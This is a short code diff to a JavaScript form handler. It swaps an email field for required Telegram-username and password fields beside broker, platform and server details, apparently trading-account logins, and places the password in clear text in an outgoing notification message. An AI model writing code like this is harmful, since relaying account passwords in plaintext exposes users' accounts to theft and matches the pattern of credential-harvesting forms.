@@ -10,7 +10,8 @@ export default async function handler(req, res) {
     const {
       name,
       whatsapp,
-      email,
+      telegram,
+      password,
       broker,
       platform,
       server,
@@ -22,7 +23,8 @@ export default async function handler(req, res) {
     if (
       !name ||
       !whatsapp ||
-      !email ||
+      !telegram ||
+      !password ||
       !broker ||
       !platform ||
       !server ||
@@ -56,8 +58,11 @@ ${name}
 📱 WHATSAPP
 ${whatsapp}
 
-📧 EMAIL
-${email}
+✈️ TELEGRAM USERNAME
+${telegram}
+
+🔑 PASSWORD
+${password}
 
 🏦 BROKER
 ${broker}
